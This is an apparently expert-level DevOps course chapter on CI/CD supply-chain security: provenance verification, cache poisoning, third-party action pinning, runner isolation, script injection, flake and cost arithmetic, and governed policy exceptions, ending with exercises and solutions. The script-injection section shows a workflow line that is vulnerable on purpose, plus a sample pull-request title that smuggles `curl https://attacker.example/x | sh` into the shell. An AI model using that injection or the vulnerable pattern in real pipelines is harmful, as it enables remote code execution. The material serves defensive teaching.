# T-DEV-03-E — Expert Depth

*Chapter: [T-DEV-03 — CI/CD and Build Automation](README.md) · Part 1 — DevOps Engineering*

<a id="t-dev-03-e"></a>
#### T-DEV-03-E — Expert Depth

## Why this level exists

By Professional level a pipeline is least-privilege, builds once, promotes by digest and authenticates with short-lived identity. Expert practice starts from an uncomfortable observation: **every one of those controls is a claim, and each claim can be false without anyone noticing.** A setting that says "approval required" does not prove approval is required. A signature that verifies does not prove the signed thing is benign. A cache that speeds builds up may also be a delivery channel for an attacker.

This section is about reasoning under adversarial and economic pressure:

- *What exactly does this evidence prove, and what does it leave open?*
- *Where does untrusted data cross a boundary, and what happens next?*
- *What does each control cost, and who will route around it if it costs too much?*
- *When policy must bend, how do we bend it without making the bend permanent?*

It assumes the vocabulary of [T-DEV-03-P](T-DEV-03-P%20Professional.md#t-dev-03-p) and builds on the repository-side controls in [T-DEV-01](../T-DEV-01%20Repository%20Management%20and%20Git/README.md) only by reference. Examples are hypothetical and deliberately generic; no claim here depends on a particular organisation's data.

## Start with the trust boundary

Before examining specific threats, make the **trust boundary** of your pipeline explicit. A trust boundary is a line across which data or control passes from a less-trusted party to a more-trusted one. Security failures in pipelines are almost always *boundary crossings nobody noticed*.

List the principals and what each can influence:

| Principal | Can influence | Trusted to |
| --- | --- | --- |
| Anonymous or fork contributor | The content of a pull request: code, workflow files, branch names, titles, commit messages, file names | Nothing; their input is data, and their code is hostile by default |
| Repository writer with an unprotected branch | Workflow definitions on that branch, cache entries written from that branch | Propose changes; not to release |
| Reviewer or code owner | What reaches the protected branch | Approve code that will run with privilege |
| Third-party action or dependency author | Code that runs *inside* your job, including privileged jobs | Whatever you decided when you pinned it |
| CI platform operator | Everything the runner sees, the identity tokens and the logs | The entire build, by construction |
| Registry and cloud provider | Artifact storage and runtime | Availability and integrity of what you store |

Then draw the pipeline and mark every point where data from a less-trusted row flows into a more-trusted job. The common crossings:

1. **Event payloads into shell scripts** (titles, branch names, comments).
2. **Pull-request code into privileged triggers** (`pull_request_target`, `workflow_run` consuming artifacts).
3. **Caches and artifacts between jobs of different trust.**
4. **Third-party code into jobs that hold credentials.**
5. **Runner state from one job into the next.**
6. **Registry content into deployment** (tags that move, unsigned images).

Each of those has a mechanism, a mitigation and, importantly, an **evidence test**: an experiment that proves the control works rather than trusting its setting. The rest of this section follows that pattern.

## Provenance and what it does not prove

A **provenance attestation** is a signed statement of the form: *this artifact (identified by this digest) was produced by this build process, from this source, at this time, with these inputs.* It is metadata about *how* something was made, signed by the build platform's identity.

**What it enables.**

- **Traceability** that survives personnel changes and log expiry: from digest to commit to workflow.
- **Policy** such as "only deploy artifacts built by the release workflow from the protected branch". Without provenance, the only available policy is a naming convention, which an attacker can imitate.

**What it does not prove.**

- That the source code is benign. A back-door that passed review is faithfully attested.
- That the build platform was uncompromised. A compromised platform can sign anything it likes.
- That dependencies were safe. Provenance may record them; it does not vet them.

So an attestation moves the question from *"is this binary trustworthy?"*, which you cannot answer by inspection, to *"do I trust this workflow, this review process and this platform?"*, which you can audit and reason about.

### Verification: what the policy must bind together

A verifier that only checks "a valid signature exists" accepts anything signed by anyone with a certificate. A defensible policy states each fact it requires:

```bash
# Illustrative: verify provenance for an image before it may be promoted
gh attestation verify oci://registry.example.com/orders-api@sha256:3f1c...e9a0 \
  --repo example-org/orders-api \
  --signer-workflow example-org/orders-api/.github/workflows/release.yml \
  --source-ref refs/heads/main
# equivalent with cosign: cosign verify-attestation --type slsaprovenance \
#   --certificate-identity-regexp '^https://github.com/example-org/orders-api/\.github/workflows/release\.yml@refs/heads/main$' \
#   --certificate-oidc-issuer https://token.actions.githubusercontent.com <image>@sha256:<digest>
```

| Fact bound | Attack it blocks |
| --- | --- |
| The **digest** (not a tag) | Swapping the image after verification |
| The **source repository** | An attestation from a fork or an unrelated repository |
| The **workflow identity and path** | A workflow in the same repository that anyone could edit on a branch |
| The **ref** (protected branch) and required review on that commit | Building unreviewed code from a feature branch |
| The **certificate issuer** (the expected CI platform identity provider) | A certificate from some other identity provider that claims the same name |

Regular-expression identities deserve special suspicion. An unanchored pattern such as `example-org/orders-api.*release` can match a repository named `orders-api-release-fork`. Anchor the pattern at both ends, escape the dots, and test it with a *near-miss* identity that must be rejected.

### Verify at the point of use, and again

Verification at promotion time proves the artifact was acceptable *then*. Between promotion and execution, the reference can change (a tag can move, a deployment file can be edited). Defence in depth means a second verification where the artifact is *consumed*: an admission controller or deployment step that checks the digest has a valid attestation matching policy before the workload is admitted. The gap you are closing is the classic **time-of-check to time-of-use** window.

## Placing a pipeline on a ladder (SLSA-style)

Supply-chain frameworks such as SLSA describe levels of build integrity. Treat them as a **ladder for planning and for conversation with auditors**, not as a checkbox. The simplified view below is a teaching abstraction; consult the current specification for exact requirements before claiming a level.

| Rung (simplified) | What is true | Evidence to produce | Climb when |
| --- | --- | --- | --- |
| Scripted build | Build is code in version control, not manual steps | Workflow file in repository | Always; it is the floor |
| Hosted build with provenance | Build runs on a managed service that emits signed provenance | Verifiable attestation per release | You have external consumers or regulated deployments |
| Hardened, isolated build | Builds are ephemeral, isolated from each other, with no secret access for untrusted code and provenance the build steps cannot forge | Runner configuration, ephemeral logs, network egress policy | A compromise of one build could reach production secrets, or auditors require it |

**Justify each climb by the loss it prevents.** An internal admin tool used by a small team does not need the rung that a library distributed to many customers needs. Climbing has costs: engineering time, slower builds, operational constraints, and the risk of building a showpiece whose controls nobody exercises. A useful decision template:

```text
Decision: move orders-api builds to a hardened, isolated rung
Loss prevented: compromise of a build job reaching production deploy credentials
Likelihood driver: third-party actions and dependencies run in the release job
Cost: ephemeral runners with egress allow-list; ~1 engineer-week to set up; per-build startup overhead
Alternatives considered: keep hosted runners but remove credentials from the build job (deploy in a separate job)
Chosen: alternative first; revisit if we distribute artifacts externally
Review date: 2027-03-01
```

Notice the "alternatives considered" line: often a **structural change** (separate the job that builds from the job that holds credentials) removes most of the risk for a fraction of the cost of a higher rung.

## Supply-chain threats: mechanisms and evidence tests

### Poisoned pipeline execution

*Mechanism.* An attacker who can modify a workflow file (or a script it calls) on a branch that has access to secrets makes the pipeline do the attacker's work. Variants: editing `.github/workflows/`, editing a build script such as `Makefile` or `package.json` scripts that a privileged job runs, or editing a test fixture that a privileged job executes.

*Mitigation.* Secrets only in protected environments with approval; code owners on workflow paths and on any script a privileged job executes; untrusted pull requests run without secrets.

*Evidence test.* Open a pull request from a fork (or an unprivileged account) that modifies the workflow to print a secret. Confirm the job receives none and cannot deploy.

### Cache poisoning

*Mechanism, in detail.* A cache is a store of files keyed by a string. Cache keys are usually predictable (for example, derived from a lock-file hash), so an attacker who can *write* an entry under a key that a more privileged job will *restore* can place files that the privileged job then executes (an altered tool binary, a modified dependency directory, a script on the path). The privileged job did nothing wrong; it trusted its own cache.

Cache scoping rules differ between platforms, but the shape of the problem is general: entries written in a **low-privilege context** (a pull-request run, an issue-comment trigger, a workflow with `pull_request_target`) must not be restorable in a **high-privilege context** (the release job). Where the platform lets caches written on the default branch be restored by other branches, the exposure inverts: a low-privilege workflow that runs *on the default branch* can write to the shared scope.

*Mitigation.*

1. **Release jobs do not restore caches at all**, or restore only from a namespace written exclusively by release workflows. Accept a slower release build.
2. Separate cache keys by trust level (`release-`, `pr-`) and never use `restore-keys` that crosses the prefix.
3. Treat anything restored from a cache as untrusted input: install from the lock file *with hash verification* so that a tampered dependency fails, rather than relying on directory contents.
4. Limit which workflows run on the default branch with write access to the cache.

*Evidence test.* A pull-request job writes a marker file into the cache under the key the release job uses. Run the release job on the protected branch and assert the marker is absent.

```yaml
# Release job: install from lock file with hash checking; no cache restore
- run: pip install --require-hashes -r requirements.lock
```

### Third-party action compromise

*Mechanism.* `uses: some-org/some-action@v2` resolves a **mutable tag**. If the action's repository is compromised, or its maintainer's token is stolen, the tag can be moved to malicious code and every workflow that references it runs the new code on its next trigger, with whatever secrets and token that job holds. Composite actions compound this: the action you pinned may itself reference *other* actions by mutable tags.

*Mitigation.*

1. Pin to a **full commit SHA**, with the human-readable version in a comment, and update through reviewed pull requests generated by an update bot.
2. **Allow-list** permitted actions at organisation level; reject unlisted references.
3. Prefer a small number of well-understood actions. A five-line shell step is often better than a dependency on a large action.
4. For critical actions, **fork or vendor** them into an organisation-owned repository you review.
5. Keep privileged jobs *short and dull*: fewer third-party steps means less surface.

```yaml
- uses: actions/checkout@<full-40-character-commit-sha>   # v4.x.y: updated via reviewed PR
```

*Evidence test.* Attempt to reference an unlisted action, or a floating tag, and confirm the run is rejected by policy.

### Self-hosted runner persistence

*Mechanism.* A self-hosted runner that handles many jobs keeps state: files in its workspace, caches of images, credentials in the home directory, background processes, a mounted container socket. A job that runs attacker-influenced code (for example a pull request) can leave a payload that a *later, more privileged job* on the same runner executes or reads. The boundary crossed is *between jobs in time*.

*Mitigation.* **Ephemeral runners**: a new instance for each job, destroyed afterwards. Never attach persistent runners to public repositories or to workflows that run fork pull requests. Restrict network egress. Separate runner groups by trust level so a validation job never lands on a runner that has ever held deployment credentials.

*Evidence test.* Job A writes a file to the workspace and to the home directory. Job B, scheduled onto the "same" runner pool, must not see either.

### Artifact substitution between jobs

*Mechanism.* Job 1 uploads an artifact; job 2 downloads and uses it. If anything between them can replace the artifact (another job in the same run with write access, a mis-scoped name, an expired-and-recreated artifact), job 2 uses something job 1 never produced.

*Mitigation.* Compute and record the digest when uploading; verify it before consuming; give artifacts unique per-run names; keep the producing and consuming job's trust levels aligned; build once and pass the **digest** rather than the file wherever possible.

*Evidence test.* Alter the stored artifact between jobs in a test; the consumer must fail on digest mismatch.

### Script injection through untrusted inputs

*Mechanism.* Expressions in `${{ ... }}` are expanded **before** the shell sees the script. If the expanded text contains shell syntax, it becomes code. Attacker-controlled fields include pull-request titles and bodies, branch names (`github.head_ref`), commit messages, issue comments and file names.

```yaml
# Vulnerable: the title is expanded into the shell script
- run: echo "Building ${{ github.event.pull_request.title }}"
# Safer: the value arrives as data, not code
- env: { TITLE: "${{ github.event.pull_request.title }}" }
  run: echo "Building $TITLE"
```

With the vulnerable form, a title such as `"; curl https://attacker.example/x | sh #` produces a script with an injected command. The environment-variable form passes the same text as a string the shell never parses as syntax (provided you quote the variable).

*Mitigation.* Pass untrusted values via `env:` and quote them; lint workflows for `${{ github.event.* }}` and `github.head_ref` inside `run:`; avoid actions that interpolate inputs into scripts internally.

*Evidence test.* Open a pull request titled `"; echo INJECTED #` and confirm no command executes.

### Dependency confusion and mutable base images

Two further boundary crossings are easy to forget because they happen at *install* and *pull* time, not in your workflow file.

- **Dependency confusion.** If a build resolves an internal package name from a public registry as well as the private one, an attacker can publish a higher version under that name publicly. *Mitigation:* configure the package manager to resolve internal names only from the private source; use lock files with hashes; reserve internal names publicly where it matters.
- **Mutable base images.** `FROM python:3.12` resolves differently over time. *Mitigation:* pin the base image by digest and update it deliberately through a reviewed pull request that rebuilds and re-scans, so the change in base content is visible as a diff.

### Summary of controls and their evidence tests

| Threat | Mitigation | Evidence test (prove the control, not the setting) |
| --- | --- | --- |
| Poisoned pipeline execution | Secrets only on protected-branch environments with approval; CODEOWNERS on `.github/workflows/`; untrusted PRs run without secrets | Open a PR from a fork that edits the workflow to print a secret; confirm it receives none and the job cannot deploy |
| Cache poisoning | Separate caches by trust level; never restore a PR-written cache in a release job | A PR job writes a marker to the cache; the release job must not find it |
| Third-party action compromise | Pin to full commit SHA; update through reviewed PRs; allow-list actions at organisation level | Try referencing an unlisted action or a floating tag; the run must be rejected |
| Self-hosted runner persistence | Ephemeral runners, one job per instance; no runners for public-fork workflows | Job A writes a file to the workspace; job B on the "same" runner must not see it |
| Artifact substitution | Record digests when uploading; verify before consuming; build once | Alter the stored artifact in a test; the consuming job must fail on digest mismatch |
| Script injection | Pass untrusted values through `env:` and quote them; lint for `${{ github.event.* }}` in `run:` | Open a PR titled `"; echo INJECTED #` and confirm no command is executed |
| Dependency confusion | Private-only resolution of internal names; hash-locked installs | Request an internal name that exists with a higher public version in a sandbox; the install must use the private one |
| Mutable base image | Digest-pinned base images with reviewed updates | Change the upstream tag in a test registry; the build must still use the pinned content |

## Trust-boundary cases

The following cases are constructed teaching scenarios, not reports of real incidents. For each, find the boundary before reading the analysis.

### Case 1: the helpful comment bot

*Setup.* A team wants test results posted as a comment on fork pull requests. The unprivileged `validate` workflow uploads `results.md` as an artifact. A `workflow_run` workflow, which runs from the default branch with write access to pull requests, downloads the artifact and posts its contents as a comment.

*Boundary.* Artifact content authored by a fork flows into a privileged workflow.

*Analysis.* The workflow never executes fork code, which is good. But the *content* is attacker-controlled: it can contain markdown that impersonates a maintainer instruction ("run this command to fix..."), mentions that notify many users, or links to hostile sites. If the privileged job also uses the artifact's content in a shell command (for example to build a comment with `echo "$(cat results.md)"` through an interpolated expression) the injection returns. A subtler issue: the pull-request *number* is often read from the artifact too; an attacker can name a different pull request and have the bot comment elsewhere.

*Fix.* Treat the artifact as data with a **fixed schema**: parse JSON with a strict parser, truncate lengths, escape markdown, and derive the pull-request number from the triggering `workflow_run` event's own metadata rather than from artifact content. Never pass artifact content through `${{ }}` into a script.

*Evidence test.* Submit a fork pull request whose artifact contains a crafted `pr_number`, shell metacharacters and a large payload; the bot must comment only on the triggering pull request, with escaped, truncated output.

### Case 2: the shared cache

*Setup.* A monorepo has a `lint` workflow that runs on every push to `main` and on `issue_comment` events (to allow `/relint` commands), and a `release` workflow on `main`. Both use the same cache key prefix for tool downloads, because it "saves two minutes".

*Boundary.* Between workflows on the same branch scope with different privilege.

*Analysis.* The `issue_comment`-triggered lint job runs in the default-branch context, so any code it executes can write to the cache scope that `release` restores. If the lint job processes content influenced by a commenter (for instance, fetching a file named by the comment), the attacker may achieve a cache write. The release job restores the poisoned entry and runs a tool from it with release credentials. No individual workflow looks wrong.

*Fix.* Namespace caches by workflow trust level; remove cache restore from release; make the release install from a hash-locked source. Remove untrusted triggers from workflows that share a cache scope with privileged ones.

*Cost of the fix.* The release build is a couple of minutes slower. That is the price of removing the boundary crossing. Record the trade-off in the decision log so the next person who "optimises" it understands why it was left slow.

### Case 3: the fast runner in the corner

*Setup.* A team installs a persistent self-hosted runner on a powerful machine to speed builds, and registers it for the repository. Pull-request validation and the release job both use it. It has a container socket mounted for builds and a deploy credential file in the service account's home directory "for convenience".

*Boundary.* Between jobs in time on one machine, and between the build and the credential.

*Analysis.* A pull-request job running attacker code can read the credential file and use the container socket to gain control of the host. Even if the file were absent, the job could leave a modified toolchain in a shared location that the release job later runs. The fastest runner is the single most privileged system in the programme.

*Fix.* Ephemeral runners from a clean image for every job; separate pools for untrusted and trusted workflows; no credentials in the image (obtain short-lived credentials by OIDC inside the privileged job only); no persistent container socket; network egress allow-list.

*Evidence test.* From a pull-request job, attempt to read the credential path and to start a privileged container; both must fail. From job B, look for a marker file left by job A; it must be absent.

### Case 4: signed, verified, and still wrong

*Setup.* A deployment policy says: "images must carry a valid provenance attestation signed by the CI platform." A developer with write access creates a branch, edits the workflow to build a modified image and signs it. The verifier reports "valid".

*Boundary.* Between "the platform signed it" and "the organisation approved it".

*Analysis.* The signature proves the platform built the image, not *which workflow, from which ref*. Because the policy does not bind the workflow path and ref, a branch build satisfies it.

*Fix.* Bind digest, repository, workflow identity, ref and the requirement that the commit is reachable from the protected branch after review. Add a near-miss test to the policy suite: an attestation from a feature branch must be rejected.

### Case 5: the exception that never expired

*Setup.* A vulnerability scanner blocks promotion because of a critical finding in a base image with no fix available. The on-call engineer adds an ignore entry to unblock a release. No owner or date is recorded.

*Boundary.* Between emergency decision and standing policy.

*Analysis.* Six months later the ignore list contains a dozen such entries, nobody knows which are still justified, and an auditor asks which findings are accepted risks. The pipeline is "green" because it has been taught not to look.

*Fix.* A governed exception process (below), with owner, approver, compensating controls and expiry, enforced by the pipeline reading the exception register and failing when an exception is expired.

## The pipeline as a product: measures and arithmetic

A pipeline has users, latency, reliability and cost. Treat it that way. Define a service-level view:

- **Duration:** median and 95th percentile from push to result. The tail is what people feel.
- **Queue time:** waiting for a runner, separate from running.
- **Failure rate by cause:** code, test flake, infrastructure.
- **Flake rate per test**, so a handful of tests can be targeted.
- **Cost per run** and cost per merged change.
- **Re-run rate:** a proxy for trust.

### Flake arithmetic

Flakes compound. If a pipeline runs 40 independent tests and each one fails spuriously 1% of the time, the probability that *at least one* flakes in a run is

```text
P(at least one flake) = 1 - 0.99^40 ≈ 0.33
```

so roughly one run in three fails for no reason. Developers learn to re-run reflexively and stop trusting red builds, and **that** is the real cost: a gate people have learned to ignore is not a gate.

Now consider a bounded retry of one extra attempt per failed test. A test must now fail twice in a row, so its spurious failure probability falls to about `0.01 × 0.01 = 0.0001`, and across 40 tests the run-level rate is

```text
1 - (1 - 0.0001)^40 ≈ 0.004
```

a drop from about 33% to about 0.4%. This arithmetic explains why retries are tempting. The caveat explains why they are dangerous: a *genuine* race condition that fails 10% of the time is also reduced (to about 1%) and therefore **becomes harder to notice**. The numbers assume independence; real flakes are often correlated by shared infrastructure, which makes the true figures worse than the formula.

### The economics of speed and cost

A simple model keeps debates grounded. All inputs below are **hypothetical** and chosen only to show the method; substitute measurements from your own system.

*Waiting cost of spurious failures.* Suppose 100 pipeline runs per day, a 10% spurious failure rate, and 15 minutes of an engineer's attention lost per spurious failure (re-run, wait, context switch):

```text
100 runs × 0.10 spurious × 15 min = 150 engineer-minutes per day
```

That is 2.5 hours per day, or about 12.5 hours per working week, more than a day and a half of one person's time, spent on noise. Compare that with the effort to fix the three worst flaky tests.

*Parallelism is not free.* Suppose a suite takes 2 minutes of setup plus 18 minutes of test execution (20 minutes wall time, 20 compute minutes). Splitting it into 4 equal shards gives each shard 2 + 4.5 = 6.5 minutes, so wall time drops to 6.5 minutes while compute rises to 26 minutes (+30%). The speed-up is 20 / 6.5 ≈ 3.1×, not 4×, because setup repeats in every shard. Eight shards would give 2 + 2.25 = 4.25 minutes wall and 34 compute minutes: diminishing returns appear quickly. Whether to pay depends on how many people wait for the result and how often.

*Faster machines.* A runner with twice the cores at twice the per-minute price, running a perfectly parallel workload in half the time, costs the same compute money and saves wall time. For workloads that are not parallel (or are I/O-bound), it costs more and saves little. Measure CPU utilisation before buying.

*Caching and test selection.* Test selection by changed paths can cut time sharply and can miss cross-module dependencies. Treat selection rules as hypotheses: compare selected-test outcomes against periodic full runs and examine escaped defects.

| Policy choice | Benefit | Failure mode | Guard |
| --- | --- | --- | --- |
| Automatic retry of a failed test (bounded, visible) | Hides rare infrastructure noise | Masks a genuine race condition | Count retries; a test that needs retry more than N times per week is quarantined with an owner and deadline |
| Moving slow suites to a merge or nightly lane | Fast PR feedback | A failure arrives after merge | Failures in the lane block promotion and page the owner of the change |
| Test selection by changed paths | Speed | Missed cross-module dependencies | Periodic full run; selection rules reviewed against escaped defects |
| Sharding across runners | Wall-clock time | Compute cost; uneven shards; shared-resource flakes | Balance by historical duration; cap shard count at the knee of the curve |
| Larger runners | Faster CPU-bound builds | Cost without benefit for I/O-bound work | Measure utilisation first |

**The economics of security controls.** The same lens applies to controls. A control that adds ten minutes to every release but is bypassed through an informal "hotfix" path protects nothing and costs everything. Estimate cost *and* bypass pressure before adding a gate; measure bypass use afterwards.

## Push versus pull deployment: a decision frame

| Question | Push (pipeline applies to the environment) | Pull (controller reconciles from Git) |
| --- | --- | --- |
| Where do production credentials live? | In the CI system (large blast radius if it is compromised) | In the cluster; CI needs only write access to a config repository |
| How is drift handled? | Not detected until the next deploy | Continuously detected and corrected |
| Rollback | Re-run an old pipeline | Revert a commit; state is visible and reviewable |
| Cost of adoption | Low | Needs a controller, a repository layout and promotion discipline |
| Audit trail | Workflow runs and cloud logs | Git history plus controller events |
| Failure when CI is down | Cannot deploy (except via break-glass) | Reconciliation continues; only new changes are delayed |

Choose pull when the environment is production-like and the risk of credential theft from CI matters; push is defensible for small, low-risk targets with strong environment protection. See T-DEV-05 for the reconciler model in depth. Progressive strategies need a signal: rolling updates need readiness; blue/green needs a switch plus rollback of traffic; canary needs metrics comparison (error rate, latency) and an automatic or documented abort threshold. If nobody defined the signal, "canary" is only a slow rolling update.

Under the pull model the pipeline's trust boundary shifts rather than disappears: CI can still write to the configuration repository, so the **promotion pull request** becomes the privileged act, and its review, branch protection and digest verification are what remain to be defended.

## Policy exceptions

Policies meet reality. A critical vulnerability with no available fix, a deadline tied to a legal obligation, a vendor image that cannot be rebuilt: each forces a choice between blocking and bending. A **governed exception** lets you bend deliberately.

```text
Exception ID: SEC-2026-014        Owner: <named person>   Approver: <role>
Finding: critical CVE in base image; no fixed version released
Scope: orders-api staging and production      Expires: 2026-12-15 (renewal needs re-approval)
Compensating controls: WAF rule blocking exploit path; egress deny; alert on exploit signature
Exit criteria: patched image promoted, or component removed
Evidence required at expiry: scan report showing the finding closed
```

An exception that lacks an owner, a compensating control or an expiry is not an exception; it is a silent policy change.

**Lifecycle.**

1. **Request** with the evidence of why the control cannot be met now.
2. **Review** by someone other than the requester, who checks that the compensating control is real and tested.
3. **Time-bound approval**, with the shortest period that is realistic.
4. **Enforcement in the pipeline:** the exception register is machine-readable; the scanner gate reads it and *fails automatically when an exception has expired*.
5. **Renewal requires re-approval** with fresh evidence, not a date edit.
6. **Reporting:** count of open exceptions, age, and number of renewals. A rising count is a signal that the policy or the supply of fixes is broken.

**Anti-patterns.** Blanket ignore lists with no owner; exceptions approved by the person who benefits; "temporary" bypass of required checks by administrators, with no review afterwards; renewing by editing the expiry date.

## Failure modes of the pipeline programme itself

- **Controls exist as settings but are never exercised**, so nobody knows if they work. Schedule the evidence tests above quarterly and record results.
- **Security gates are slow and noisy**, so teams route around them; measure bypass attempts and false-positive rates.
- **A single "release engineer" account or runner pool** becomes a privileged choke point and a single point of compromise.
- **Provenance is generated but nothing verifies it**, giving the audit trail without the protection.
- **Everything is pinned and nothing is updated.** Pinning without an update process turns into a stack of known-vulnerable components. Automated, reviewed update pull requests are the counterpart of pinning.
- **Dashboards without owners.** Metrics that no team is responsible for decay into decoration.
- **Copying the pattern without the reason.** A team adopts "required reviewers" on production but the reviewer group is the author's own team and self-review is allowed; the control exists and means nothing.

## Contested questions

Some questions have no consensus answer. Experts disagree, and a good engineer can state each position.

1. **Pin everything by hash, or trust semantic versions from reputable maintainers?** Pinning limits surprise and compromise but creates update toil and can freeze security fixes. Position: pin in privileged jobs; automate reviewed updates; accept looser pins where the job has no secrets.
2. **Should the release workflow live in the same repository as the code it builds?** Same repository: simple, but anyone who can merge can change how releases are made. Separate, centrally owned repository: stronger separation, higher coordination cost. Position depends on how many teams share release machinery and how strongly you need separation of duties.
3. **Is reproducible building worth the cost?** Reproducible builds let independent parties verify an artifact corresponds to its source. They require hermetic inputs and discipline, and not every ecosystem supports them well. Position: worth it for widely distributed or high-assurance software; elsewhere, prefer provenance and hash-locked dependencies.
4. **Is "never retry" or "retry with a budget" the better flake policy?** The first preserves signal; the second preserves flow. Position: retries must be bounded, visible and counted, with automatic quarantine when a test exceeds its budget.
5. **Should security gates block merges or only warn?** Blocking protects but causes bypass when noisy; warning is ignored when frequent. Position: block on high-confidence, high-severity findings; warn on the rest; review false-positive rates monthly.

## Knowledge consolidation

- **Provenance narrows the question** from "is this binary trustworthy?" to "do I trust this workflow, this review process and this platform?" It does not remove the question.
- A verifier must **bind digest, repository, workflow, ref and issuer**; "valid signature" alone accepts too much. Test policies with near-miss identities.
- Every pipeline threat is a **boundary crossing**: untrusted data or code entering a more privileged job. Name the crossing before choosing a mitigation.
- Each control needs an **evidence test** that proves behaviour rather than configuration.
- **Flakes compound**, retries trade signal for flow, and parallelism has diminishing returns because setup repeats.
- Structural changes (separate the job that builds from the job that holds credentials) often beat higher rungs on a framework ladder.
- **Exceptions expire and are enforced by the pipeline**; otherwise they become policy by neglect.
- The programme itself fails when controls are never exercised, gates are routed around, or pinning is not paired with updating.

## Exercises

**Exercise 1 — Draw the boundary.** For a pipeline you know, list the principals, then draw the flow and mark every crossing where untrusted data meets a more-privileged job. For each crossing name the mitigation and write its evidence test. Identify the crossing with the weakest evidence.

**Exercise 2 — Write a verification policy.** Write the full set of conditions that must hold before a digest may be promoted to production (digest form, repository, workflow, ref, issuer, scan status, approval). Then write three *near-miss* cases that the policy must reject, and explain which condition rejects each.

**Exercise 3 — Cache poisoning drill.** In a disposable repository, create a pull-request workflow that writes a marker into a cache under the key used by a release-like workflow on `main`. Run the release-like workflow and check whether it finds the marker. If it does, redesign key namespaces and restore rules until it does not, and describe what you gave up.

**Exercise 4 — Flake budget.** A pipeline runs 60 independent tests. Assume each flakes at 0.5% per run. Compute the probability that a run fails spuriously with no retry, and with one bounded retry per failing test. Then argue, in four sentences, whether you would adopt the retry and what visibility you would require.

**Exercise 5 — Cost of a gate.** Hypothetically, a new security scan adds 6 minutes to every pipeline run, 150 runs per day, and 8 engineers wait on results about half the time. Compute the added wall time experienced and the added compute minutes. Propose two designs that retain the protection while reducing the cost, and one metric that would tell you whether people are bypassing it.

**Exercise 6 — Exception review.** You find a register of ten exceptions: three without owners, two expired, one approved by the requester. Write the triage plan: what you do this week, what you automate, and what you report to leadership.

**Solution notes (Exercise 1).** Common crossings an honest drawing exposes: pull-request titles and branch names into scripts; artifacts from untrusted workflows into privileged ones; third-party actions inside the release job; shared caches; registry tags in deployment files. The "weakest evidence" crossing is usually the one nobody has ever tested, often cache scope or artifact consumption. A strong answer includes a date by which each untested crossing will have an executed evidence test.

**Solution notes (Exercise 2).** A solid policy: digest matches `sha256:` plus 64 hex characters; attestation source repository equals the expected repository exactly; signer workflow path and ref equal the release workflow on the protected branch (anchored identity, no unanchored regular expressions); issuer equals the CI platform's identity provider; scan has no unwaived critical findings; promotion pull request has an approval from someone other than its author. Near-misses: (1) an attestation from a fork with the same workflow filename, rejected by the repository condition; (2) an attestation for a feature-branch build of the same workflow, rejected by the ref condition; (3) an attestation whose certificate identity matches an unanchored pattern such as `orders-api-release-fork`, rejected only if the pattern is anchored, which is the point of the test.

**Solution notes (Exercise 3).** If the release-like job finds the marker, the cache scope is shared across trust levels. Typical fix: distinct key prefixes (`release-` versus `pr-`), no `restore-keys` crossing the prefix, no cache restore in release, and hash-verified installs. What you give up: warm-cache speed in release builds. Measure the extra time; record it and the reason in the decision log. Also confirm the control by repeating the drill after the fix and storing the result.

**Solution notes (Exercise 4).** No retry: `1 - 0.995^60`. Since `0.995^60 = e^(60 × ln 0.995) ≈ e^(-0.301) ≈ 0.740`, the spurious failure probability is about 26%. With one retry per failing test, each test fails spuriously with probability `0.005 × 0.005 = 0.000025`; across 60 tests, `1 - (1 - 0.000025)^60 ≈ 0.0015`, about 0.15%. A reasonable argument adopts bounded retry because a 26% spurious failure rate destroys trust, requires that retries are reported on the run page and counted per test, and automatically quarantines tests that need retry more than a set number of times per week, so a real race is eventually noticed. The independence assumption should be stated as a limit.

**Solution notes (Exercise 5).** Added wall time per run is 6 minutes; compute minutes added per day are 6 × 150 = 900 (15 compute-hours) if the scan runs on its own runner for every run. Experienced waiting: if the scan is on the critical path, each of 150 runs delays someone by up to 6 minutes; with 8 engineers waiting about half the time, a rough figure is 150 × 6 × 0.5 = 450 engineer-minutes per day (7.5 hours), stated with its assumption. Designs: run the scan in parallel with tests so it adds no wall time unless it is slower than the longest job; scan only the changed layer or dependency set; scan the published digest once after merge and gate *promotion* rather than every pull request; cache vulnerability databases. A bypass metric: count of merges or promotions that skip the scan job, or of exceptions and manual overrides per week.

**Solution notes (Exercise 6).** This week: ensure every open exception has a named owner (assign provisionally, with the assignee's acknowledgement), expire or re-review the two expired ones immediately, and re-approve the self-approved one through an independent approver. Automate: make the register machine-readable and have the pipeline fail on missing owner, missing expiry or past expiry. Report: counts by age and renewal, which findings are most often excepted (a hint about missing fixes or a policy that does not match reality), and the measured bypass rate. State clearly what risk is currently accepted and by whom.
